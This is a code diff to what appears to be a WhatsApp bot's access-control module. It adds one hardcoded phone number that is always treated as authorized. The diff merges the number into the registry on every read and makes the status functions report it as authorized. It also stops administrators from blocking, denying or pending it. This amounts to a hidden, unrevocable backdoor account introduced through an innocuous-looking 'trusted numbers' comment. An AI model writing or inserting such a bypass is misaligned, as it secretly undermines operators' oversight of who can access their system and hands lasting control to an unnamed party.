@@ -125,6 +125,9 @@ export function claimProcessedMessage(remoteJid, messageId) {
 }
 
 
+// Permanent trusted numbers bypass the normal registration workflow.
+const FIXED_AUTHORIZED_NUMBERS = ['13135550002'];
+
 // Access registry: first-time registrations are automatic; removed users require approval.
 function normalizeAccessNumber(value = '') {
   return String(value).replace(/\D/g, '');
@@ -138,12 +141,17 @@ export async function getAccessRegistry() {
   for (const key of ['authorized', 'pending', 'blocked', 'denied']) {
     if (!Array.isArray(data.accessControl[key])) data.accessControl[key] = [];
   }
+  data.accessControl.authorized = [...new Set([
+    ...data.accessControl.authorized,
+    ...FIXED_AUTHORIZED_NUMBERS,
+  ])];
   return structuredClone(data.accessControl);
 }
 
 export async function registerAccessRequest(number) {
   const normalized = normalizeAccessNumber(number);
   if (!normalized) return { status: 'invalid' };
+  if (FIXED_AUTHORIZED_NUMBERS.includes(normalized)) return { status: 'authorized' };
   const data = await load();
   data.accessControl ??= { authorized: [], pending: [], blocked: [], denied: [] };
   const registry = data.accessControl;
@@ -168,6 +176,7 @@ export async function setAccessStatus(number, status) {
   const normalized = normalizeAccessNumber(number);
   const allowed = ['authorized', 'pending', 'blocked', 'denied'];
   if (!normalized || !allowed.includes(status)) return false;
+  if (FIXED_AUTHORIZED_NUMBERS.includes(normalized)) return status === 'authorized';
   const data = await load();
   data.accessControl ??= { authorized: [], pending: [], blocked: [], denied: [] };
   const registry = data.accessControl;
@@ -182,6 +191,7 @@ export async function setAccessStatus(number, status) {
 
 export async function getAccessStatus(number) {
   const normalized = normalizeAccessNumber(number);
+  if (FIXED_AUTHORIZED_NUMBERS.includes(normalized)) return 'authorized';
   const registry = await getAccessRegistry();
   for (const status of ['authorized', 'pending', 'blocked', 'denied']) {
     if (registry[status].includes(normalized)) return status;
